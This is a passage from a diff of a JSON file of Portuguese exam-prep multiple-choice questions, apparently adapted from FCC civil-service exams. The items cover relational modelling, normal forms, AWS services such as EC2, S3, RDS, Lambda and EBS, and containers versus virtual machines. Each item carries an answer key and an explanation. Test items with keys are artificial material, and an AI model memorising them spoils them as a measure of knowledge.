+    "statement": ")\nUm Analista de TI de um Tribunal Regional do Trabalho está desenvolvendo um novo sistema de controle de processos eletrônicos. Durante a fase de modelagem de dados, ele identifica que um `Juiz` pode estar lotado em várias `Varas`, e uma `Vara` pode ter vários `Juízes` lotados nela ao longo do tempo. Para representar corretamente esse cenário no modelo lógico relacional, sem violar a normalização e garantindo o histórico de lotações, o Analista deve:",
+    "options": {
+      "A": "Inserir a chave primária de `Vara` como chave estrangeira na tabela `Juiz` e criar uma coluna do tipo array para os anos.",
+      "B": "Criar uma tabela associativa (ex: `Lotacao`) recebendo como chaves estrangeiras as chaves primárias de `Juiz` e `Vara`, adicionando a coluna `Data_Inicio` para compor a chave primária composta e permitir o histórico.",
+      "C": "Adicionar a chave primária de `Juiz` na tabela `Vara`, permitindo valores nulos.",
+      "D": "Mesclar ambas as entidades em uma única tabela `Juiz_Vara` para evitar anomalias de junção (JOIN).",
+      "E": "Implementar a relação usando uma dependência transitiva direta, dispensando chaves estrangeiras."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Relacionamentos N:M (muitos-para-muitos) exigem a criação de uma tabela associativa no modelo lógico relacional. Como há necessidade de histórico (o mesmo juiz pode voltar à mesma vara anos depois), a data passa a compor a chave primária, evitando violação de integridade."
+  },
+  {
+    "id": 682,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nAo analisar o dicionário de dados de um sistema legado de Recursos Humanos, um engenheiro de dados percebeu a seguinte estrutura na tabela `Empregado`: (CPF, Nome, Cod_Departamento, Nome_Departamento, Local_Departamento). Sabe-se que `CPF` é a chave primária e que `Nome_Departamento` e `Local_Departamento` dependem única e exclusivamente de `Cod_Departamento`. Do ponto de vista da teoria da normalização, esta tabela viola diretamente a:",
+    "options": {
+      "A": "Primeira Forma Normal (1FN), pois possui atributos compostos.",
+      "B": "Segunda Forma Normal (2FN), caracterizando dependência parcial.",
+      "C": "Terceira Forma Normal (3FN), caracterizando dependência funcional transitiva.",
+      "D": "Forma Normal de Boyce-Codd (FNBC), pois a chave primária possui determinantes não atômicos.",
+      "E": "Quarta Forma Normal (4FN), configurando dependência multivalorada."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A tabela possui uma dependência transitiva: (Nome_Departamento, Local) -> dependem de -> (Cod_Departamento) -> que depende de -> (CPF). A Terceira Forma Normal proíbe dependências transitivas, exigindo que os atributos do departamento sejam separados em uma tabela própria."
+  },
+  {
+    "id": 683,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nO setor de estatística judiciária reportou lentidão extrema na extração de relatórios gerenciais que cruzavam dados de 8 tabelas altamente normalizadas (na 3FN). Para resolver esse gargalo no banco de dados analítico (OLAP), o DBA recomendou um processo deliberado de quebra das formas normais, fundindo tabelas e inserindo dados redundantes, como armazenar o 'Total de Processos' na própria tabela da Vara. Essa técnica de tuning é tecnicamente denominada:",
+    "options": {
+      "A": "Normalização de Boyce-Codd.",
+      "B": "Desnormalização.",
+      "C": "Modelagem Entidade-Relacionamento Fraca.",
+      "D": "Injeção de Dependências SQL.",
+      "E": "Particionamento Vertical."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. A desnormalização é a prática consciente de violar regras de normalização (adicionando redundância calculada) em prol de otimização de velocidade de leitura, reduzindo a necessidade de JOINs pesados."
+  },
+  {
+    "id": 684,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nDurante a construção de um modelo Entidade-Relacionamento (ER), um Analista identificou a entidade `Dependente`. Observou-se que um dependente não possui atributos suficientes para formar uma chave primária própria e só existe no sistema se estiver associado a um `Servidor`. Se o registro do servidor for apagado, os dependentes também devem ser. Na modelagem de dados, a entidade `Dependente` é classicamente conceituada como:",
+    "options": {
+      "A": "Entidade Associativa.",
+      "B": "Entidade Especializada.",
+      "C": "Entidade Multivalorada.",
+      "D": "Entidade Fraca.",
+      "E": "Entidade Forte com chave sintética."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. Entidades fracas não possuem chave própria para se identificarem de maneira única de forma independente. Elas dependem de uma entidade forte (Servidor) e herdam a chave dessa entidade, compondo-a com seu atributo discriminador parcial."
+  },
+  {
+    "id": 685,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nUma tabela chamada `Contrato_Fornecedor` possui a seguinte chave primária composta: (`CNPJ_Fornecedor`, `Numero_Contrato`). Além disso, ela possui as colunas `Razao_Social_Fornecedor`, `Data_Assinatura` e `Valor_Global`. O Analista de banco de dados nota que `Razao_Social_Fornecedor` depende apenas do `CNPJ_Fornecedor`, e não do `Numero_Contrato`. Esta modelagem:",
+    "options": {
+      "A": "Fere a 1FN, pois contém atributos nulos.",
+      "B": "Fere a 2FN, pois apresenta uma dependência parcial da chave primária composta.",
+      "C": "Atende à 3FN, pois todos os atributos não chave dependem da chave primária composta como um todo.",
+      "D": "Fere a 4FN, pois cria dependências de junção (Join Dependencies) cíclicas.",
+      "E": "É o modelo ideal para ambientes OLTP focados na integridade referencial cruzada."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. A Segunda Forma Normal (2FN) proíbe a dependência parcial. Isso significa que atributos não-chave devem depender da chave primária inteira. Como `Razao_Social` depende apenas de uma parte da chave (`CNPJ_Fornecedor`), a tabela não está na 2FN."
+  },
+  {
+    "id": 686,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nAo migrar um banco de dados de um sistema de controle de frotas, constatou-se que na tabela `Veiculo` havia uma coluna `Telefones_Motorista` armazenando os valores '9999-1111, 8888-2222' em uma mesma célula (string separada por vírgula). Para adequar o banco de dados à Primeira Forma Normal (1FN), o procedimento arquitetural correto a ser adotado pelo DBA é:",
+    "options": {
+      "A": "Alterar o tipo de dados da coluna para JSONB e manter na mesma tabela.",
+      "B": "Remover a coluna da tabela `Veiculo` e criar uma nova tabela `Telefone` (ID_Veiculo, Numero_Telefone), com um registro para cada telefone, garantindo a atomicidade dos valores.",
+      "C": "Criar três colunas fixas: `Telefone1`, `Telefone2` e `Telefone3` na própria tabela `Veiculo`.",
+      "D": "Aplicar a Terceira Forma Normal (3FN) criando chaves estrangeiras cíclicas.",
+      "E": "Transformar o atributo em um Atributo Derivado usando Triggers."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. A 1FN exige que todos os atributos sejam atômicos (indivisíveis) e proíbe arrays, listas ou grupos repetitivos (como os telefones juntos). A solução clássica relacional é tirar o atributo multivalorado e transformá-lo em uma nova tabela (1:N)."
+  },
+  {
+    "id": 687,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nUm arquiteto de software desenhou um esquema de banco de dados para um Tribunal. Ele afirmou na reunião técnica: 'Garantimos que todas as tabelas do sistema não possuem atributos não-chave dependendo transitivamente da chave primária'. Com essa afirmação, ele garante tecnicamente que o banco de dados alcançou no mínimo a:",
+    "options": {
+      "A": "Primeira Forma Normal (1FN).",
+      "B": "Segunda Forma Normal (2FN).",
+      "C": "Terceira Forma Normal (3FN).",
+      "D": "Quarta Forma Normal (4FN).",
+      "E": "Quinta Forma Normal (5FN)."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A definição formal de Terceira Forma Normal (3FN) é justamente estar na 2FN e não possuir dependências funcionais transitivas entre os atributos não-chave e a chave primária."
+  },
+  {
+    "id": 688,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nA Forma Normal de Boyce-Codd (FNBC) foi criada para lidar com certas anomalias que a 3FN deixava passar. Em relação à FNBC, assinale a alternativa correta que descreve sua regra fundamental no processo de normalização:",
+    "options": {
+      "A": "Ela exige que todos os campos da tabela componham a chave primária.",
+      "B": "Uma relação está na FNBC se e somente se, para toda dependência funcional não trivial (X -> Y), o determinante (X) for uma superchave candidata.",
+      "C": "A FNBC lida especificamente com dependências multivaloradas independentes, que ocorrem em relacionamentos N:M:P.",
+      "D": "A FNBC é aplicável apenas em bancos de dados NoSQL orientados a grafos.",
+      "E": "Ela permite dependências parciais, desde que os atributos sejam inteiros e não strings."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Essa é a definição acadêmica da FNBC. Todo determinante (o lado esquerdo da dependência) deve ser uma superchave (uma chave candidata). A FNBC resolve anomalias quando a tabela tem chaves candidatas compostas e sobrepostas, o que a 3FN não prevê completamente."
+  },
+  {
+    "id": 689,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nO modelo Entidade-Relacionamento original, proposto por Peter Chen, prevê a existência de 'Atributos Derivados'. No mapeamento lógico desse modelo para um banco de dados físico relacional (ex: PostgreSQL), como um Atributo Derivado (ex: 'Idade', derivada da 'Data de Nascimento') é comumente implementado para preservar a normalização estrita?",
+    "options": {
+      "A": "É transformado em uma tabela associativa com chave estrangeira dupla.",
+      "B": "É armazenado como uma coluna do tipo Inteiro com restrição UNIQUE.",
+      "C": "É fisicamente omitido da tabela (não vira coluna fixa), sendo seu valor calculado em tempo de execução via consultas, Views ou colunas virtuais geradas.",
+      "D": "É mapeado como um Atributo Multivalorado usando XML.",
+      "E": "Vira a chave primária da entidade, pois seu valor muda constantemente."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Atributos derivados, por definição, dependem de outros dados. Armazená-los quebra a normalização e gera redundância/anomalia de atualização. O correto é calculá-los on-the-fly (ex: calcular a idade no SELECT usando CURRENT_DATE - Data_Nascimento)."
+  },
+  {
+    "id": 690,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nUm banco de dados contém uma tabela `Professor_Disciplina` com os atributos (`CPF_Professor`, `Cod_Disciplina`, `Data_Inicio`). Essa modelagem mapeia um relacionamento muitos-para-muitos (N:M). A fim de garantir que um mesmo professor não seja cadastrado duas vezes ensinando a mesma disciplina na mesma data de início, a chave primária ideal para essa tabela lógica deve ser:",
+    "options": {
+      "A": "Somente o `CPF_Professor`, deixando os outros como campos nulos.",
+      "B": "Somente o `Cod_Disciplina`, usando um índice HASH.",
+      "C": "Uma chave composta formada pelos três atributos: (`CPF_Professor`, `Cod_Disciplina`, `Data_Inicio`).",
+      "D": "Uma chave estrangeira circular para a tabela de Alunos.",
+      "E": "A chave composta apenas por (`CPF_Professor`, `Data_Inicio`)."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A tabela é associativa com dados de histórico (Data_Inicio). A chave primária deve ser a união das chaves estrangeiras (CPF e Cod_Disciplina) mais a Data_Inicio para garantir a unicidade exata desse triplo, permitindo que o professor dê a mesma disciplina, mas em datas diferentes."
+  },
+  {
+    "id": 691,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nDurante uma auditoria, constatou-se que a exclusão de um registro na tabela `Cargo` falhou porque um registro na tabela `Servidor` ainda fazia referência àquele cargo. Esse comportamento de bloqueio do banco de dados relacional que evita quebras e referências 'órfãs' está intimamente atrelado ao conceito de:",
+    "options": {
+      "A": "Normalização de Boyce-Codd.",
+      "B": "Dependência Multivalorada (4FN).",
+      "C": "Integridade Referencial (Chave Estrangeira).",
+      "D": "Atomicidade e Isolamento das Transações (ACID).",
+      "E": "Modelagem Estrela (Star Schema)."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A integridade referencial garante que uma Chave Estrangeira num banco de dados relacional deve sempre apontar para um registro válido na tabela referenciada. Se você tentar apagar o 'Pai', o banco bloqueia a ação se houverem 'Filhos', prevenindo registros órfãos."
+  },
+  {
+    "id": 692,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nNa Engenharia da Informação para Sistemas Gerenciadores de Banco de Dados, a diferença clássica entre o 'Modelo Lógico' e o 'Modelo Físico' é que:",
+    "options": {
+      "A": "O modelo lógico contém detalhes de hardware, tamanho de disco (tablespaces) e tipos de dados físicos de um SGBD específico (ex: VARCHAR(50) no Oracle), enquanto o físico abstrai as tecnologias.",
+      "B": "O modelo lógico utiliza unicamente diagramas de casos de uso da UML, e o físico utiliza Diagramas de Classes.",
+      "C": "O modelo lógico é independente do SGBD que será utilizado, focando na representação relacional (tabelas, chaves primárias e estrangeiras), enquanto o modelo físico aplica isso às restrições técnicas (tipos de dados nativos, índices B-Tree) de um SGBD específico (ex: SQL Server).",
+      "D": "Não há diferença prática entre os dois nas metodologias ágeis.",
+      "E": "O modelo físico só pode ser desenhado para bancos NoSQL orientados a colunas."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O modelo lógico relacional desenha as tabelas e relacionamentos sem amarrar a uma engine. O modelo físico pega o modelo lógico e o amarra a um software (cria tabelas físicas, escolhe entre `serial` do Postgres ou `identity` do SQL Server, define indexação física)."
+  },
+  {
+    "id": 693,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nUm sistema corporativo possui a tabela `Veiculo` (Placa, Marca, Modelo, Chassi). Sabemos que 'Placa' foi escolhida como chave primária, mas 'Chassi' também identifica inequivocamente um veículo de forma única. No jargão da modelagem de dados, 'Chassi' recebe a classificação de:",
+    "options": {
+      "A": "Atributo Multivalorado.",
+      "B": "Chave Estrangeira Transacional.",
+      "C": "Atributo Derivado e Agregado.",
+      "D": "Chave Candidata ou Chave Alternativa.",
+      "E": "Chave de Junção Cíclica."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. Qualquer conjunto de atributos que possa identificar unicamente a linha é uma Chave Candidata. Escolhemos uma delas para ser a Chave Primária (Placa). As que 'sobraram' (Chassi) viram Chaves Alternativas (muitas vezes implementadas com a restrição UNIQUE no banco físico)."
+  },
+  {
+    "id": 694,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nConsidere o relacionamento de Herança (Especialização/Generalização) no modelo Entidade-Relacionamento Extendido (EER): 'Pessoa' é a superclasse, 'Física' e 'Jurídica' são subclasses. O mapeamento dessa estrutura para tabelas no modelo lógico relacional pode ser feito de algumas formas. A estratégia que cria apenas UMA única tabela `Pessoa` contendo todos os atributos genéricos e específicos, utilizando uma coluna 'Tipo' (discriminador) para identificar qual o perfil do registro, resultará obrigatoriamente em:",
+    "options": {
+      "A": "Uma violação grave da 1FN, gerando arrays binários inoperáveis.",
+      "B": "Muitas células vazias (valores Nulos/Null) nos atributos específicos dependendo do tipo da pessoa (ex: CNPJ será nulo se for pessoa física).",
+      "C": "Redundância massiva da chave primária, exigindo o uso de Triggers complexos de deleção.",
+      "D": "A necessidade de quebrar a tabela em tabelas de relacionamento n:m.",
+      "E": "Desempenho lento devido ao uso obrigatório de comandos JOIN nas consultas básicas."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. A técnica de \"Tabela Única\" (Single Table) para herança coloca todos os atributos na mesma tabela. Se a pessoa for Jurídica, as colunas específicas de Física (CPF, RG, Estado Civil) ficarão NULL."
+  },
+  {
+    "id": 695,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Banco de Dados: Modelagem ER + Normalização de Dados",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Banco de Dados, ER e Normalização",
+    "statement": ")\nUm DBA identificou que a Quarta Forma Normal (4FN) foi violada em um banco de dados governamental. A 4FN é requerida especificamente quando o modelo de dados encontra:",
+    "options": {
+      "A": "Dependências parciais de chaves compostas por mais de 5 campos.",
+      "B": "Atributos derivados que demoram mais de 10 segundos para serem processados.",
+      "C": "Múltiplas dependências transitivas interligadas (ex: A->B, B->C, C->D).",
+      "D": "A existência de dependências multivaloradas independentes dentro da mesma tabela (ex: um Professor leciona Múltiplas Matérias e possui Múltiplos Hobbies, sem que a matéria tenha relação com o hobby).",
+      "E": "Dados binários extensos (BLOBs) salvos fora do sistema de arquivos tradicional."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. A 4FN lida com o isolamento de múltiplas dependências multivaloradas (relacionamentos 1:N) que não têm correlação direta entre si, armazenadas na mesma tabela. Para corrigir, separa-se em duas tabelas diferentes (ex: Professor_Materia e Professor_Hobby)."
+  },
+  {
+    "id": 696,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nUm Arquiteto de Nuvem está desenhando uma infraestrutura tolerante a falhas na AWS. Ele possui uma aplicação web monolítica rodando em servidores Amazon EC2. Para garantir que o sistema sobreviva se um datacenter físico inteiro da AWS perder o fornecimento elétrico de forma abrupta, ele deve arquitetar sua solução implantando os servidores EC2 balanceados entre:",
+    "options": {
+      "A": "Múltiplos buckets S3 isolados geograficamente.",
+      "B": "Diferentes Contas da AWS dentro da mesma sub-rede (Subnet).",
+      "C": "Múltiplas Zonas de Disponibilidade (Availability Zones - AZs) localizadas dentro da mesma Região da AWS.",
+      "D": "Uma única Zona de Disponibilidade, alocando recursos em um Edge Location dedicado.",
+      "E": "Bancos de dados Amazon RDS usando cópias Single-AZ otimizadas para fita magnética."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A infraestrutura global da AWS divide o mundo em Regiões (ex: São Paulo - sa-east-1). Cada Região possui múltiplas Zonas de Disponibilidade (AZs), que são data centers fisicamente isolados e independentes. Dividir a frota entre AZs protege contra a queda física de um prédio inteiro."
+  },
+  {
+    "id": 697,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nO time de desenvolvimento utiliza a AWS para realizar processamentos em lote pesados e intermitentes à noite, gerando relatórios PDF. Esses processamentos não têm pressa de começar e podem ser pausados a qualquer momento caso a Amazon exija a capacidade computacional de volta. Com o objetivo central de obter a máxima redução de custo (podendo chegar a 90% de desconto) no Amazon EC2 para essa carga de trabalho, o gestor de TI deve contratar instâncias no modelo:",
+    "options": {
+      "A": "Sob demanda (On-Demand).",
+      "B": "Reservadas (Reserved Instances) com adiantamento integral (All-Upfront).",
+      "C": "Servidores Dedicados (Dedicated Hosts).",
+      "D": "Computação Serverless via Amazon S3.",
+      "E": "Instâncias Spot (Spot Instances)."
+    },
+    "answer": "E",
+    "explanation": "- E) Correta. As Instâncias Spot aproveitam a capacidade ociosa dos servidores da AWS e são as mais baratas. O revés é que a AWS pode encerrar a instância (interrompê-la) avisando apenas 2 minutos antes se precisar do recurso de volta. É o modelo perfeito para processamento em lote intermitente e resiliente."
+  },
+  {
+    "id": 698,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nUm dos pilares da conteinerização no Linux é o isolamento dos processos e dos recursos da máquina. Qual recurso em nível de Kernel Linux é o principal responsável por limitar a quantidade máxima de uso de Memória RAM e processamento de CPU que um container específico (como um pod Docker/Kubernetes) pode consumir no host?",
+    "options": {
+      "A": "Namespaces.",
+      "B": "Hypervisor Bare-metal Tipo 1.",
+      "C": "Control Groups (cgroups).",
+      "D": "iptables e nftables.",
+      "E": "OverlayFS."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O Kernel Linux utiliza *Namespaces* para o isolamento lógico (para que o container não veja processos dos outros) e usa *Control Groups (cgroups)* para o limite e auditoria dos recursos físicos (CPU, RAM, Disco)."
+  },
+  {
+    "id": 699,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nNa arquitetura de banco de dados na AWS, o Amazon RDS (Relational Database Service) facilita a configuração, operação e escalabilidade de SGBDs relacionais. Quando o DBA do Tribunal precisa escalar a capacidade do banco para suportar um aumento gigantesco de requisições analíticas (Leituras complexas) originadas por painéis de Business Intelligence, sem onerar as operações transacionais pesadas (Gravações) do banco primário, a funcionalidade do RDS mais adequada para resolver o problema é a criação de:",
+    "options": {
+      "A": "Multi-AZ Standby Replicas.",
+      "B": "Amazon Aurora Serverless.",
+      "C": "Réplicas de Leitura (Read Replicas).",
+      "D": "Amazon DynamoDB Streams sincronizados assincronamente.",
+      "E": "Volumes provisionados de IOPS na instância principal."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. As *Read Replicas* criam instâncias exclusivas que espelham (recebem) os dados da instância master e são destinadas a processar as cargas de LEITURA, aliviando o tráfego do banco principal (que continua lidando com a ESCRITA)."
+  },
+  {
+    "id": 700,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nAo estudar a virtualização em datacenters tradicionais comparada à arquitetura orientada a Cloud-native, um Analista verifica que a principal diferença entre Máquinas Virtuais (VMs) e Containers (Docker) é baseada na abordagem em relação ao Sistema Operacional Hospedeiro. Assinale a afirmação correta:",
+    "options": {
+      "A": "Containers abstraem o hardware, exigindo que cada container rode seu próprio Guest OS (Sistema Operacional Convidado) completo, desde o processo de boot.",
+      "B": "Máquinas Virtuais não dependem de Hypervisors; elas compartilham de forma nativa o kernel do sistema operacional através de módulos DLLs injetados.",
+      "C": "Containers compartilham o Kernel (núcleo) do sistema operacional do host subjacente, o que os torna muito leves, rápidos no boot e eficientes no uso de memória em comparação com VMs que emulam hardwares e rodam SOs completos.",
+      "D": "Containers e VMs são conceitualmente sinônimos, diferenciando-se apenas no uso de comandos shell ou interface gráfica.",
+      "E": "A virtualização de servidor (VM) é exclusiva de ambientes Windows, enquanto Containers só podem rodar bancos de dados NoSQL."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Essa é a diferença arquitetural essencial. Uma VM precisa emular o hardware virtual (processador, rede) e rodar um Windows/Linux inteiro dentro dela. Um Container Docker não emula hardware; ele é apenas um grupo de processos isolados que usa o Kernel real da máquina física hospedeira."
+  },
+  {
+    "id": 701,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nO Amazon S3 (Simple Storage Service) armazena dados em Buckets. Para fins de auditoria de logs judiciais, é necessário que o armazenamento no S3 garanta que os arquivos sejam gravados de tal forma que ninguém, nem o usuário administrador master da conta AWS, consiga modificar, regravar ou excluir os objetos durante um prazo legal de 5 anos (modelo WORM - Write Once, Read Many). A funcionalidade nativa do S3 que assegura esse requisito de segurança anti-sabotagem é o:",
+    "options": {
+      "A": "Amazon EC2 Security Groups.",
+      "B": "S3 Intelligent-Tiering e Glacier Flex.",
+      "C": "S3 Cross-Region Replication (CRR).",
+      "D": "S3 Object Lock (Bloqueio de Objeto).",
+      "E": "S3 Transfer Acceleration."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. O S3 Object Lock (aliado ao versionamento) permite congelar um arquivo pelo período desejado, impedindo exclusões acidentais ou propositais (ex: ataque de Ransomware limpando backups)."
+  },
+  {
+    "id": 702,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nO desenvolvedor criou um código em Python no modelo Serverless (sem servidor) na nuvem. A aplicação deve disparar um script autônomo toda vez que um cidadão enviar um documento (PDF) para um Bucket S3. O serviço de computação da AWS que executa pequenos trechos de código acionados por eventos sem provisionar a infraestrutura básica e cobrando na casa dos milissegundos é o:",
+    "options": {
+      "A": "Amazon RDS.",
+      "B": "AWS Elastic Beanstalk.",
+      "C": "AWS Lambda.",
+      "D": "Amazon Route 53.",
+      "E": "Amazon EBS (Elastic Block Store)."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O AWS Lambda é a espinha dorsal do modelo Serverless da AWS. Ele executa Funções orientadas a eventos (FaaS - Function as a Service) escalando de zero a milhares de requisições automaticamente."
+  },
+  {
+    "id": 703,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nUm profissional configurou um volume de armazenamento anexado a uma máquina EC2 para atuar como o 'Disco Rígido' persistente C:/ da instância Windows em nuvem, armazenando o sistema operacional e a base de dados SQL Server. Ao contrário do S3 que é baseado em objetos, este tipo de serviço da AWS trabalha com arquitetura de armazenamento em BLOCO (Block Storage), ideal para SGBDs relacionais e file systems nativos. Esse serviço é o:",
+    "options": {
+      "A": "Amazon EFS (Elastic File System).",
+      "B": "Amazon RDS.",
+      "C": "Amazon DynamoDB.",
+      "D": "Amazon EBS (Elastic Block Store).",
+      "E": "Amazon CloudFront."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. O Amazon EBS provê blocos 'crus' de disco que podem ser formatados (NTFS, EXT4) e anexados à rede nas máquinas virtuais EC2. Ele atua como o 'HD' clássico na nuvem."
+  },
+  {
+    "id": 704,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nNa arquitetura de hipervisores em ambientes On-Premises, a diferença entre Hypervisor Tipo 1 (Bare-Metal) e Tipo 2 (Hosted) impacta diretamente o desempenho e a forma de implantação dos servidores. Assinale a alternativa que conceitua corretamente o Hypervisor Tipo 1:",
+    "options": {
+      "A": "É instalado diretamente sobre o hardware físico (placa-mãe, processador, RAM) da máquina servidora, não requerendo um sistema operacional tradicional hospedeiro pré-instalado (como Windows 11) para funcionar.",
+      "B": "Depende nativamente do Windows 10 para rodar seus serviços paralelos via aplicativos instalados (ex: VMware Workstation Player).",
+      "C": "Roda exclusivamente no modo de usuário (User Space) do Kernel do Linux usando bibliotecas gráficas.",
+      "D": "Só consegue virtualizar contêineres Docker, mas não Máquinas Virtuais.",
+      "E": "Impede a criação de redes virtuais isoladas por motivos de segurança intrínseca do microcódigo."
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. Hypervisores do Tipo 1 (ex: VMware ESXi, Hyper-V Standalone, Xen) são o próprio sistema operacional. Eles instalam diretamente no hardware (bare-metal) proporcionando performance superior. Os do Tipo 2 (ex: VirtualBox) instalam em cima de um SO que já está rodando."
+  },
+  {
+    "id": 705,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nPara empacotar uma aplicação Python com Docker garantindo a repetibilidade e independência de ambiente de execução (Testes, Homologação e Produção), o analista redige um arquivo de texto declarativo instruindo como o motor do Docker deve baixar a imagem base do Alpine Linux, copiar o código-fonte, instalar pacotes pip e expor a porta HTTP do aplicativo Flask. O nome técnico padrão deste arquivo na ferramenta Docker é:",
+    "options": {
+      "A": "docker-compose.yml.",
+      "B": "Kubernetes Deployment (pod.yaml).",
+      "C": "Dockerfile.",
